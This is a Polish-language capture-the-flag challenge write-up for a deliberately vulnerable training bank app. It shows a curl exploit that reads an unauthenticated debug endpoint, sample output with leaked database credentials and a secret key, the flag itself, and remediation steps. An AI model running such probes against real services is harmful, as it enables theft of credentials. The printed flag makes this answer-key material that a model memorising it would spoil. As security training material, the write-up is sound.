# A02 — Security Misconfiguration

## Metadane
- **ID:** A02
- **Kategoria:** OWASP A02:2025 - Security Misconfiguration
- **Trudność:** easy
- **Punkty:** 100
- **Flaga:** `PWR{debug_config_exposed}`

## Opis
Deweloper zostawił endpoint diagnostyczny `/api/debug/config` w środowisku produkcyjnym.
Endpoint zwraca pełną zawartość zmiennych środowiskowych — w tym klucze, hasła i flagę CTF.
Dostępny **bez żadnej autoryzacji**.

## Podatny endpoint
```
GET /api/debug/config
# Brak nagłówka Authorization — działa dla wszystkich
```

## Exploit
```bash
curl http://localhost:5000/api/debug/config | python3 -m json.tool | grep FLAG
```

Wyjście będzie zawierać:
```json
{
  "environment": {
    "FLAG_A02": "PWR{debug_config_exposed}",
    "DATABASE_URL": "postgresql://vulnbank:vulnbank@db/vulnbank",
    "SECRET_KEY": "supersecretkey",
    ...
  }
}
```

## Jak to naprawić
1. Usuń endpoint `/api/debug/config` z kodu produkcyjnego
2. Używaj feature flag lub zmiennej `FLASK_ENV != "development"` do jego wyłączenia
3. Nigdy nie przechowuj sekretów w zmiennych środowiskowych bez szyfrowania
4. Dodaj autoryzację na KAŻDY endpoint diagnostyczny

## Referencje
- OWASP A02:2025 - Security Misconfiguration
- [CWE-215: Insertion of Sensitive Information Into Debugging Code](https://cwe.mitre.org/data/definitions/215.html)
